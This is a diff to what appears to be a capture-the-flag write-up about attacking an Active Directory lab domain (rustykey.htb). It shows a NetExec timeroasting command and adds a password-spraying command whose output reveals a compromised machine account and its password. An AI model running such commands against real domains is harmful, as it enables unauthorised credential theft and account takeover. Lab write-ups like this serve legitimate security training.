@@ -167,7 +167,7 @@ Ill use `--rid-brute` to also get machine accounts
 
 There is also no passwords stored in user descriptions
 
-# Timeroasting leads to user compromise
+# Timeroasting leads to account compromise
 
 ```python
  ❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k -M timeroast
@@ -225,5 +225,12 @@ I placed the output into a file, then ill cut the output so they are crackable
 Only one of them cracked
 
 ```python
+❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u users.txt -p 'Rusty88!' -k --continue-on-success
 
+...[SNIP]...
+
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! 
 ```
+
+I have compromise the machine account `IT-Computer3$`
+
